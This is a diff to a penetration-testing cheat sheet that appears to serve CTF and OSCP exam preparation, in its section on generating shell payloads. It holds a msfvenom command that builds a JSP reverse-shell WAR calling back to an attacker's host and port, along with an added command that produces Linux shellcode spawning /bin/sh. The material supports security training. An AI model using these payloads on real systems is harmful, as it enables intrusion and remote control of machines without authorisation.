@@ -91,7 +91,7 @@ Wordlist:
 For CTF / OSCP, should not take you more than 30 mins to crack
 
 
-## generate reverse shell payload
+## generate reverse or local shell payload
 - msfvnon https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
@@ -100,6 +100,10 @@ For CTF / OSCP, should not take you more than 30 mins to crack
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
     ```
 - payload types, use `msfvenom --list payloads`, see `/mnt/hgfs/kali-vm/msfvenom_payloads.txt`
+- generate local shell code
+    ```shell
+    msfvenom -p linux/x86/exec CMD=/bin/sh -b "x00x0axff" -f c
+    ```
 
 ## convert reverse shell to tty
 ```python
